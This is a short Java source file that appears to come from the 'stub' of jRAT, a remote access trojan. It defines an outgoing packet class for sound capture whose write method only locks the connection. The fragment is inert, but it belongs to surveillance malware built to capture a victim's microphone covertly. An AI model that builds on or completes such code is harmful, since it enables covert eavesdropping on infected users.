package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;
import io.jrat.stub.Connection;

import java.io.DataOutputStream;


public class Packet58SoundCapture extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		Connection.lock();
	}

	@Override
	public byte getPacketId() {
		return 58;
	}

}
